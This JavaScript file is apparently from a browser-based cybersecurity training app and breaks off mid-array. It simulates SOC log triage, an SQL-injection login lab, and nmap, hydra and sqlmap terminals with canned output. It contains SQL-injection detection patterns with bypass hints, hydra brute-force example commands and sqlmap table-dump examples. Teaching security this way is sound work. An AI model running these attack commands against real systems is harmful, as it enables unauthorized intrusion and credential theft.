      document.querySelectorAll('.terminal-line').forEach(el => el.classList.remove('selected'));
      logLine.classList.add('selected');
      socFlaggedScenario = lineScenario;
      
      const intelPanel = document.getElementById('threatIntelPanel');
      if (intelPanel) {
        let riskScore = isMalicious ? Math.floor(Math.random() * 20 + 80) : Math.floor(Math.random() * 20 + 10);
        let geo = isMalicious ? 'Unknown/Tor' : 'US-EAST';
        let rep = isMalicious ? '<span class="intel-risk">High Risk</span>' : '<span class="intel-clean">Clean</span>';
        let sourcePort = Math.floor(Math.random() * 50000 + 1024);
        let userAgent = isMalicious ? 'curl/7.68.0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
        intelPanel.innerHTML = `
          <div class="intel-item intel-capture">
            <div class="intel-capture-label">captured request</div>
            <div class="intel-capture-req"><strong>${escapeHtml(actualMethod)}</strong> ${escapeHtml(actualPath)}</div>
            <div class="intel-capture-status">Status: ${escapeHtml(actualStatus)}</div>
          </div>
          <div class="intel-item"><strong>IP Address:</strong> <span>${escapeHtml(actualIp)}</span></div>
          <div class="intel-item"><strong>Source Port:</strong> <span>${sourcePort}</span></div>
          <div class="intel-item"><strong>User Agent:</strong> <span>${escapeHtml(userAgent)}</span></div>
          <div class="intel-item"><strong>GeoLocation:</strong> <span>${geo}</span></div>
          <div class="intel-item"><strong>Threat Score:</strong> <span>${riskScore}/100</span></div>
          <div class="intel-item"><strong>Reputation:</strong> <span>${rep}</span></div>
          <div class="intel-analysis">
            <strong>Analysis:</strong>
            <span class="intel-analysis-text">
              ${isMalicious ? 'Pattern matches known exploitation signatures. Immediate mitigation required.' : 'Traffic patterns appear nominal. No malicious signatures detected.'}
            </span>
          </div>
        `;
      }
      
      if (isMalicious) {
        document.getElementById('remediationPanel').classList.remove('locked');
        const wafIndicator = document.getElementById('wafStatusIndicator');
        const wafAction = document.getElementById('wafLastAction');
        if (wafIndicator && wafAction) {
          wafIndicator.dataset.state = 'alert';
          wafAction.textContent = 'Anomaly Detected. Awaiting Analyst Action.';
          wafAction.dataset.state = 'alert';
        }
      } else {
        document.getElementById('remediationPanel').classList.add('locked');
        // Briefly show error toast
        socToast('False Positive. Keep looking.');
      }
    };
    
    // Check if scrolled to bottom BEFORE appending
    const isScrolledToBottom = terminal.scrollHeight - terminal.clientHeight <= terminal.scrollTop + 20;

    terminal.appendChild(logLine);
    
    // Keep max 100 lines
    if (terminal.children.length > 100) {
      terminal.removeChild(terminal.firstChild);
    }
    
    // Only auto-scroll if the user was already at the bottom
    if (isScrolledToBottom) {
      terminal.scrollTop = terminal.scrollHeight;
    }
  }, 800);
}

// Which remediation actions actually address each threat vector.
const VALID_REMEDIATION = {
  sqli:  ['BLOCK_IP'],
  xss:   ['BLOCK_IP'],
  path:  ['BLOCK_IP'],
  ssrf:  ['BLOCK_IP', 'ISOLATE'],
  brute: ['RATE_LIMIT', 'RESET'],
  cmdi:  ['ISOLATE'],
  idor:  ['RESET', 'ISOLATE']
};

function socToast(message) {
  const toast = document.createElement('div');
  toast.className = 'soc-toast';
  toast.setAttribute('role', 'status');
  toast.textContent = message;
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 2000);
}

function submitRemediation(action) {
  // Must have flagged a real threat first.
  if (!socFlaggedScenario) {
    socToast('Flag a valid threat in the log before applying remediation.');
    return;
  }

  const valid = VALID_REMEDIATION[socFlaggedScenario] || [];
  if (!valid.includes(action)) {
    socToast('Incorrect remediation for this threat vector. Try again.');
    return;
  }

  // Update WAF UI
  const wafIndicator = document.getElementById('wafStatusIndicator');
  const wafAction = document.getElementById('wafLastAction');
  if (wafIndicator && wafAction) {
    delete wafIndicator.dataset.state;
    wafAction.textContent = 'Threat Mitigated: ' + action;
    wafAction.dataset.state = 'ok';
  }

  if (socStreamInterval) { clearInterval(socStreamInterval); socStreamInterval = null; }
  socFlaggedScenario = null;
  const panel = document.getElementById('remediationPanel');
  panel.innerHTML = `
    <div class="soc-resolved">
      <div class="soc-resolved-icon" aria-hidden="true">&#10003;</div>
      <h3>Threat Neutralized!</h3>
      <p>Excellent work, Analyst. The ${escapeHtml(action)} policy has been applied and the network is secure.</p>
      <div class="soc-resolved-actions">
        <button class="btn btn-boot" onclick="window.__app.resumeSocSimulator()">Continue Monitoring</button>
        <button class="btn btn-secondary" onclick="window.__app.exitSoc()">Exit SOC</button>
      </div>
    </div>
  `;
}

/* ═══════════════════════════════════════════════════════════════════════════════
   UTILITIES
   ═══════════════════════════════════════════════════════════════════════════════ */

function escapeHtml(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function escapeAttr(str) {
  return String(str == null ? '' : str).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function formatRisk(risk) {
  if (!risk) return '';
  const c = risk.toLowerCase();
  if (c === 'high')   return `<span class="risk-high">${risk}</span>`;
  if (c === 'medium') return `<span class="risk-medium">${risk}</span>`;
  if (c === 'low')    return `<span class="risk-low">${risk}</span>`;
  return risk;
}

function resumeSocSimulator() {
  const panel = document.getElementById('remediationPanel');
  if (panel && originalRemediationHTML) {
    panel.innerHTML = originalRemediationHTML;
  }
  
  const wafIndicator = document.getElementById('wafStatusIndicator');
  const wafAction = document.getElementById('wafLastAction');
  if (wafIndicator && wafAction) {
    delete wafIndicator.dataset.state;
    wafAction.textContent = '0 Threats Mitigated';
    delete wafAction.dataset.state;
  }
  
  const intelPanel = document.getElementById('threatIntelPanel');
  if (intelPanel) {
    intelPanel.innerHTML = '<p>Select a log entry to analyze IP reputation and threat score.</p>';
  }
  
  // Randomly pick a new scenario for variety
  const scenarios = ['random', 'sqli', 'xss', 'brute', 'path', 'cmdi', 'idor', 'ssrf'];
  const selectEl = document.getElementById('socScenarioSelect');
  if (selectEl) {
    if (selectEl.value !== 'random') {
       selectEl.value = scenarios[Math.floor(Math.random() * (scenarios.length - 1)) + 1];
    }
  }
  
  startSocSimulator();
}

/* ═══════════════════════════════════════════════════════════════════════════════
   SETTINGS & THEMES
   ═══════════════════════════════════════════════════════════════════════════════ */

function toggleSettings() {
  const modal = document.getElementById('settingsModal');
  if (modal.classList.contains('active')) {
    modal.classList.remove('active');
  } else {
    modal.classList.add('active');
  }
}

function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  if (sidebar) {
    sidebar.classList.toggle('collapsed');
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   TERMINAL SIMULATOR — Shared scaffolding
   Each handler calls simulateTerminalCommand() with its config; only the
   command-specific result logic lives inside each handler.
   ═══════════════════════════════════════════════════════════════════════════════ */

/**
 * Shared runner for nmap / hydra / sqlmap simulator terminals.
 * @param {object} cfg
 *   outputId    — element ID for the output div
 *   terminalId  — element ID for the scrollable terminal div
 *   loadingId   — unique ID for the transient "loading" span
 *   promptHtml  — the coloured prompt HTML (already escaped)
 *   guardFn     — fn(cmd) → string|null  (returns error message or null if OK)
 *   resolveFn   — fn(cmd) → { result: string, delay: number }
 */
function simulateTerminalCommand({ outputId, terminalId, loadingId, promptHtml, guardFn, resolveFn }) {
  return function(cmd) {
    const outputEl   = document.getElementById(outputId);
    const terminalEl = document.getElementById(terminalId);
    if (!outputEl) return;

    outputEl.innerHTML += `\n${promptHtml} ${escapeHtml(cmd)}\n`;

    const guardMsg = guardFn(cmd);
    if (guardMsg !== null) {
      outputEl.innerHTML += guardMsg + '\n';
      terminalEl.scrollTop = terminalEl.scrollHeight;
      return;
    }

    const { result, delay } = resolveFn(cmd);
    outputEl.innerHTML += `<span id="${loadingId}" class="sim-muted">Executing...</span>`;
    terminalEl.scrollTop = terminalEl.scrollHeight;

    setTimeout(() => {
      const loading = document.getElementById(loadingId);
      if (loading) loading.remove();
      outputEl.innerHTML += result + '\n';
      terminalEl.scrollTop = terminalEl.scrollHeight;
    }, delay);
  };
}

/* ── SQLi PRACTICE LAB — pure classifier (DOM-free, unit-testable) ───────────── */

/**
 * Classifies a submitted email/password pair against the SQLi Practice Lab's
 * simulated query SELECT * FROM users WHERE email='?' AND password='?'.
 * Returns { state: 'danger'|'success'|'warning'|null, html: string }.
 * Bypass/UNION detection and their output strings are unchanged from the
 * original inline implementation; only ORDER BY probing and odd-quote syntax
 * errors are new.
 */
function classifySqliAttempt(email, pass) {
  const SQLI_SIM_COLUMNS = 2; // matches "UNION SELECT username, password FROM users" in the tutorial
  const combined = email + pass;
  const quoteCount = (combined.match(/'/g) || []).length;
  const orderByMatch = /order\s+by\s+(\d+)/i.exec(email);

  const isUnion = /union\s+select/i.test(combined);
  const isBypass = !orderByMatch && (
    /'\s*(or|OR)\s+["']?1["']?\s*=\s*["']?1["']?/i.test(combined)
    || /(--|#)\s*$/.test(email)
    || /'\s*(or|OR)\s+'\w+'\s*=\s*'\w+/i.test(combined)
    || isUnion
  );
  const isValid = email === 'normal@user.com' && pass === 'correctpassword';

  if (isUnion) {
    return { state: 'warning', html: '<strong>UNION-based Injection Detected</strong><br><br>Database dump:<br>admin@site.com : $2b$12$hash1...<br>user@site.com : $2b$12$hash2...<br><br><em>All user records extracted!</em>' };
  }
  if (isBypass) {
    return { state: 'danger', html: '<strong>Authentication Bypassed!</strong><br><br>Logged in as: <strong>admin@site.com</strong><br>Role: <strong>Administrator</strong><br>Token: eyJhbGciOiJSUzI1NiJ9...<br><br><em>The WHERE clause was broken by your injection.</em>' };
  }
  if (orderByMatch) {
    const n = parseInt(orderByMatch[1], 10);
    if (n > SQLI_SIM_COLUMNS) {
      return { state: 'warning', html: `<strong>SQL Error</strong><br><br>Unknown column '${n}' in 'order clause'<br><br><em>The query only returns ${SQLI_SIM_COLUMNS} columns — ORDER BY ${n} goes past the end. The last number that did not error is the column count.</em>` };
    }
    return { state: null, html: `<strong>401 Unauthorized</strong><br><br>Invalid email or password.<br><br><em>No SQL error at ORDER BY ${n} — the query has at least ${n} column(s). Try a higher number to find where it breaks.</em>` };
  }
  if (isValid) {
    return { state: 'success', html: '<strong>Login Successful</strong><br><br>Welcome back, normal@user.com<br>Role: user<br><br><em>This is a legitimate authentication — no injection.</em>' };
  }
  if (quoteCount % 2 === 1) {
    return { state: 'warning', html: "<strong>500 Internal Server Error</strong><br><br>You have an error in your SQL syntax; check the manual that corresponds to your database server version for the right syntax to use near &#39;&#39;<br><br><em>An unmatched quote broke the query string — the field is injectable. Now craft a payload (a tautology with a trailing comment) to actually bypass the check.</em>" };
  }
  return { state: null, html: '<strong>401 Unauthorized</strong><br><br>Invalid email or password.<br><br><em>Payload did not bypass authentication. Try a different injection.</em>' };
}

/* ── NMAP SIMULATOR ─────────────────────────────────────────────────────────── */

const handleNmapCommand = simulateTerminalCommand({
  outputId:   'nmapSimOutput',
  terminalId: 'nmapSimTerminal',
  loadingId:  'nmapSimLoading',
  promptHtml: `<span class="sim-prompt">[user@cyber-lab ~]$</span>`,
  guardFn: (cmd) => {
    if (!cmd.startsWith('nmap') && !cmd.startsWith('ping'))
      return `<span class="sim-err">Command not found or not supported in this simulator. Try 'nmap' or 'ping'.</span>`;
    return null;
  },
  resolveFn: (cmd) => {
    const isPing = cmd.startsWith('ping');
    const delay  = isPing ? 500 : 1500;
    let result = '';
    if (isPing) {
      result = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2045ms
rtt min/avg/max/mdev = 0.032/0.037/0.041/0.003 ms`;
    } else if (cmd.includes('-A')) {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Practice Shop - Offline Lab

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds`;
    } else if (cmd.includes('-sV')) {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.12 seconds`;
    } else if (cmd.includes('-sn')) {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0020s latency).
Nmap scan report for 192.168.1.10
Host is up (0.0031s latency).
Nmap scan report for 192.168.1.105
Host is up (0.0011s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.34 seconds`;
    } else {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds`;
    }
    return { result, delay };
  }
});

/* ── HYDRA SIMULATOR ────────────────────────────────────────────────────────── */

function handleHydraCommand(cmd) {
  const outputEl   = document.getElementById('hydraSimOutput');
  const terminalEl = document.getElementById('hydraSimTerminal');
  if (!outputEl) return;

  outputEl.innerHTML += `\n<span class="sim-prompt">[user@cyber-lab ~]$</span> ${escapeHtml(cmd)}\n`;

  if (cmd === 'hydra' || cmd === 'hydra --help' || cmd === 'hydra -h') {
    outputEl.innerHTML += `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
              [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]]
              [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET]
              [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN   : login with LOGIN name
  -L FILE    : load logins from FILE
  -p PASS    : try password PASS
  -P FILE    : load passwords from FILE
  -C FILE    : colon separated "login:pass" format
  -t TASKS   : run TASKS number of connects in parallel (default: 16)
  -w TIME    : max wait time in seconds (default: 32)
  -s PORT    : specify port
  -f          : exit after first found login/password pair
  -V          : verbose mode (show each attempt)
  -v          : very verbose mode
  -o FILE    : write found pairs to FILE
  -e nsr     : try "n" null password, "s" login as pass, "r" reversed

Supported services:
  ssh ftp http-post-form http-get-form mysql rdp smb telnet vnc

Example:
  hydra -l admin -P passwords.txt ssh://192.168.1.1
  hydra -l user -P pass.txt -s 8000 shop.local http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  if (!cmd.startsWith('hydra')) {
    outputEl.innerHTML += `<span class="sim-err">Command not found. This simulator only supports 'hydra' commands. Type 'hydra' for help.</span>\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  const isVerbose = cmd.includes('-V');
  const delay = isVerbose ? 2500 : 1800;

  outputEl.innerHTML += `<span id="hydraSimLoading" class="sim-muted">Hydra starting at ${new Date().toLocaleTimeString()}...\n[DATA] Attacking target...</span>`;
  terminalEl.scrollTop = terminalEl.scrollHeight;

  setTimeout(() => {
    const loading = document.getElementById('hydraSimLoading');
    if (loading) loading.remove();

    let result = '';
    const timestamp = new Date().toLocaleTimeString();

    if (cmd.includes('ssh://') || cmd.includes('ssh:')) {
      const target = escapeHtml(cmd.match(/ssh:\/\/([^\s]+)/)?.[1] || '192.168.1.1');
      const user = escapeHtml(cmd.match(/-l\s+(\S+)/)?.[1] || 'admin');
      if (isVerbose) {
        result = `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tests
[DATA] attacking ssh://${target}:22/
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "123456" - 1 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "password" - 2 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "12345678" - 3 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "qwerty" - 4 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "abc123" - 5 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "monkey" - 6 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "1234567" - 7 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "letmein" - 8 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "trustno1" - 9 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "dragon" - 10 of 14344392</span>
<span class="sim-ok">[22][ssh] host: ${target}   login: ${user}   password: dragon</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      } else {
        result = `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tests
[DATA] attacking ssh://${target}:22/
<span class="sim-ok">[22][ssh] host: ${target}   login: ${user}   password: dragon</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      }
    } else if (cmd.includes('ftp://') || cmd.includes('ftp:')) {
      const target = escapeHtml(cmd.match(/ftp:\/\/([^\s]+)/)?.[1] || '192.168.1.1');
      const user = escapeHtml(cmd.match(/-l\s+(\S+)/)?.[1] || 'admin');
      result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
[DATA] attacking ftp://${target}:21/
<span class="sim-ok">[21][ftp] host: ${target}   login: ${user}   password: admin123</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
    } else if (cmd.includes('http-post-form') || cmd.includes('http-get-form')) {
      const user = escapeHtml(cmd.match(/-l\s+(\S+)/)?.[1] || 'admin');
      const target = escapeHtml(cmd.match(/(\S+)(?:\s+-s\s+\d+)?\s+http-(?:post|get)-form/)?.[1] || 'shop.local');
      if (isVerbose) {
        result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
[DATA] attacking http-post-form://${target}/
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "123456" - 1 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "password" - 2 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "admin123" - 3 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "iloveyou" - 4 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "princess" - 5 of 14344392</span>
<span class="sim-muted">[ATTEMPT] target ${target} - login "${user}" - pass "admin" - 6 of 14344392</span>
<span class="sim-ok">[80][http-post-form] host: ${target}   login: ${user}   password: admin123</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      } else {
        result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
[DATA] attacking http-post-form://${target}/
<span class="sim-ok">[80][http-post-form] host: ${target}   login: ${user}   password: admin123</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      }
    } else {
      // Generic / unrecognized hydra flags
      result = `[WARNING] No valid target service specified.
[ERROR] Hydra requires a target in the format: service://host
Example: hydra -l admin -P passwords.txt ssh://192.168.1.1
Type 'hydra' for full usage.`;
    }

    outputEl.innerHTML += result + '\n';
    terminalEl.scrollTop = terminalEl.scrollHeight;
  }, delay);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   SQLMAP SIMULATOR
   ═══════════════════════════════════════════════════════════════════════════════ */

function handleSqlmapCommand(cmd) {
  const outputEl = document.getElementById('sqlmapSimOutput');
  const terminalEl = document.getElementById('sqlmapSimTerminal');
  if (!outputEl) return;

  outputEl.innerHTML += `\n<span class="sim-prompt">[sqlmap]$ </span>${escapeHtml(cmd)}\n`;
  terminalEl.scrollTop = terminalEl.scrollHeight;

  if (cmd === 'sqlmap --help' || cmd === 'sqlmap -h') {
    outputEl.innerHTML += `<span class="sim-key">Usage:</span> sqlmap [options]\n\n<span class="sim-key">Target:</span>\n  -u URL             Target URL (e.g. http://site.com/page?id=1)\n  -r FILE            Load HTTP request from file\n\n<span class="sim-key">Detection:</span>\n  --level=LEVEL      Detection level (1-5, default: 1)\n  --risk=RISK        Risk of tests (1-3, default: 1)\n\n<span class="sim-key">Techniques:</span>\n  --technique=TECH   SQL injection techniques (B/E/U/S/T/Q)\n                     B=Boolean, E=Error, U=Union, T=Time\n\n<span class="sim-key">Enumeration:</span>\n  --dbs              Enumerate DBMS databases\n  --tables           Enumerate tables\n  --columns          Enumerate columns\n  --dump             Dump table entries\n  -D DB              DBMS database to enumerate\n  -T TBL             Table to enumerate\n\n<span class="sim-key">Fingerprint:</span>\n  -b, --banner       Retrieve DBMS banner\n  --current-user     Retrieve current DB user\n  --current-db       Retrieve current DB\n\n<span class="sim-key">Examples:</span>\n  sqlmap -u "http://target.com/item?id=1" --dbs\n  sqlmap -u "http://target.com/item?id=1" -D shopdb --tables\n  sqlmap -u "http://target.com/item?id=1" -D shopdb -T users --dump\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  if (!cmd.startsWith('sqlmap')) {
    outputEl.innerHTML += `<span class="sim-err">Command not found. Type 'sqlmap --help' for usage.</span>\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  const hasUrl = /-u\s+["']?https?:\/\//i.test(cmd);
  if (!hasUrl && !cmd.includes('-r ')) {
    outputEl.innerHTML += `<span class="sim-err">No target URL specified. Use: sqlmap -u "http://target.com/page?id=1"</span>\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  const urlMatch = cmd.match(/-u\s+["']?(https?:\/\/[^\s"']+)["']?/i);
  const targetUrl = urlMatch ? urlMatch[1] : 'http://target.com/vuln?id=1';
  const targetHost = escapeHtml(targetUrl.split('/')[2] || 'target.com');
  const hasDbs = cmd.includes('--dbs');
  const hasTables = cmd.includes('--tables');
  const hasDump = cmd.includes('--dump');
  const hasColumns = cmd.includes('--columns');
  const hasBanner = cmd.includes('-b') || cmd.includes('--banner');
  const hasCurrentUser = cmd.includes('--current-user');
  const hasCurrentDb = cmd.includes('--current-db');
  const dbFlag = cmd.match(/-D\s+(\S+)/)?.[1] ? escapeHtml(cmd.match(/-D\s+(\S+)/)[1]) : undefined;
  const tblFlag = cmd.match(/-T\s+(\S+)/)?.[1] ? escapeHtml(cmd.match(/-T\s+(\S+)/)[1]) : undefined;
  const level = cmd.match(/--level=(\d)/)?.[1] || '1';
  const risk = cmd.match(/--risk=(\d)/)?.[1] || '1';

  outputEl.innerHTML += `<span class="sim-muted">        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.12#stable}</span>\n`;
  outputEl.innerHTML += `[*] starting @ ${new Date().toLocaleTimeString()}\n`;
  outputEl.innerHTML += `[*] testing connection to target URL...\n`;
  terminalEl.scrollTop = terminalEl.scrollHeight;

  const delay = hasDump ? 2200 : hasTables ? 1800 : 1400;
  outputEl.innerHTML += `<span id="sqlmapLoading" class="sim-muted">testing...</span>`;

  setTimeout(() => {
    const loading = document.getElementById('sqlmapLoading');
    if (loading) loading.remove();

    outputEl.innerHTML += `[*] testing if the target URL content is stable... <span class="sim-ok">yes</span>\n`;
    outputEl.innerHTML += `[*] testing if GET parameter 'id' is dynamic... <span class="sim-ok">yes</span>\n`;
    outputEl.innerHTML += `[*] heuristic (basic) test shows that GET parameter 'id' might be injectable\n`;
    outputEl.innerHTML += `[*] testing for SQL injection on GET parameter 'id'\n`;
    outputEl.innerHTML += `[*] testing 'AND boolean-based blind - WHERE or HAVING clause'\n`;
    outputEl.innerHTML += `[*] GET parameter 'id' appears to be <span class="sim-ok">Boolean-based injectable</span>\n`;
    outputEl.innerHTML += `[*] testing 'MySQL >= 5.0.12 AND time-based blind'\n`;
    outputEl.innerHTML += `[*] GET parameter 'id' appears to be <span class="sim-ok">Time-based injectable (stacked queries)</span>\n`;
    outputEl.innerHTML += `[*] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n`;
    outputEl.innerHTML += `[*] automatically extending ranges for UNION query injection technique\n`;
    outputEl.innerHTML += `[*] <span class="sim-ok">target URL appears to be UNION injectable with 3 columns</span>\n\n`;
    outputEl.innerHTML += `<span class="sim-ok">sqlmap identified the following injection point(s):</span>\n`;
    outputEl.innerHTML += `---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1 AND 1871=1871\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1 AND SLEEP(5)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=NULL UNION ALL SELECT NULL,CONCAT(0x7162717071,...),NULL--\n---\n`;

    const dbms = 'MySQL >= 5.0 (MariaDB fork)';
    outputEl.innerHTML += `[*] the back-end DBMS is <span class="sim-key">${dbms}</span>\n`;

    if (hasBanner) outputEl.innerHTML += `[*] fetching banner\nbanner: '5.7.40-0ubuntu0.22.04.1'\n`;
    if (hasCurrentUser) outputEl.innerHTML += `[*] fetching current user\ncurrent user: 'webapp@localhost'\n`;
    if (hasCurrentDb) outputEl.innerHTML += `[*] fetching current database\ncurrent database: 'shopdb'\n`;

    if (hasDbs) {
      outputEl.innerHTML += `\n[*] fetching database names\n[*] retrieved: 3\navailable databases [3]:\n[*] information_schema\n[*] <span class="sim-ok">shopdb</span>\n[*] mysql\n`;
    }
    if (hasTables && dbFlag) {
      outputEl.innerHTML += `\n[*] fetching tables for database: '${dbFlag}'\n[*] retrieved: 4\nDatabase: ${dbFlag}\n[4 tables]\n+----------+\n| users    |\n| products |\n| orders   |\n| sessions |\n+----------+\n`;
    }
    if (hasColumns && dbFlag && tblFlag) {
      outputEl.innerHTML += `\n[*] fetching columns for table '${tblFlag}' in database '${dbFlag}'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[4 columns]\n+----------+--------------+\n| Column   | Type         |\n+----------+--------------+\n| id       | int(11)      |\n| email    | varchar(200) |\n| password | varchar(300) |\n| role     | varchar(50)  |\n+----------+--------------+\n`;
    }
    if (hasDump && dbFlag && tblFlag) {
      outputEl.innerHTML += `\n[*] fetching entries of column(s) 'email,password,role' for table '${tblFlag}' in database '${dbFlag}'\n[*] recognized possible password hashes in column 'password'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[3 entries]\n+---------+-----------------------------+----------+\n| id      | email                       | role     |\n+---------+-----------------------------+----------+\n| 1       | <span class="sim-err">admin@company.com</span>           | <span class="sim-key">admin</span>    |\n| 2       | alice@company.com           | user     |\n| 3       | bob@company.com             | user     |\n+---------+-----------------------------+----------+\n\n<span class="sim-ok">table dumped to '/root/.local/share/sqlmap/output/${targetHost}/dump/${dbFlag}/${tblFlag}.csv'</span>\n`;
    }
    if (!hasDbs && !hasTables && !hasDump && !hasColumns && !hasBanner && !hasCurrentUser && !hasCurrentDb) {
      outputEl.innerHTML += `\n[*] <span class="sim-key">Tip:</span> Vulnerability confirmed! Now enumerate with:\n    --dbs              (list databases)\n    -D shopdb --tables (list tables)\n    -D shopdb -T users --dump  (dump user table)\n`;
    }
    outputEl.innerHTML += `\n[*] ending @ ${new Date().toLocaleTimeString()}\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
  }, delay);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   PACKET LAB SIMULATOR
   ═══════════════════════════════════════════════════════════════════════════════ */

function initPacketLab() {
  const listEl = document.getElementById('packetList');
  const detailEl = document.getElementById('packetDetail');
  const analysisEl = document.getElementById('packetAnalysis');
  const filterInput = document.getElementById('packetFilter');
  const filterBtn = document.getElementById('packetFilterBtn');
  const clearFilterBtn = document.getElementById('packetClearFilter');
  const startBtn = document.getElementById('packetStartCapture');
  if (!listEl) return;

  let packetIndex = 0;
  let captureInterval = null;
  if (window.__packetCaptureInterval) { clearInterval(window.__packetCaptureInterval); window.__packetCaptureInterval = null; }
  let allPackets = [];

  const normalPackets = [
    { proto:'HTTP',  src:'192.168.1.10',   dst:'93.184.216.34', len:341, info:'GET /index.html HTTP/1.1', malicious:false },
    { proto:'DNS',   src:'192.168.1.10',   dst:'8.8.8.8',       len:66,  info:'Standard query A example.com', malicious:false },
    { proto:'TLS',   src:'192.168.1.10',   dst:'172.217.14.206',len:583, info:'Application Data (encrypted)', malicious:false },
    { proto:'HTTP',  src:'192.168.1.105',  dst:'93.184.216.34', len:198, info:'GET /images/logo.png HTTP/1.1', malicious:false },
    { proto:'TCP',   src:'192.168.1.10',   dst:'10.0.0.1',      len:60,  info:'[SYN] Seq=0 Win=65535', malicious:false },
    { proto:'DNS',   src:'192.168.1.15',   dst:'8.8.8.8',       len:74,  info:'Standard query A api.company.com', malicious:false },
    { proto:'HTTP',  src:'192.168.1.22',   dst:'203.0.113.10',  len:420, info:'POST /api/login HTTP/1.1', malicious:false },
    { proto:'ARP',   src:'192.168.1.1',    dst:'ff:ff:ff:ff',   len:42,  info:'Who has 192.168.1.50? Tell 192.168.1.1', malicious:false },
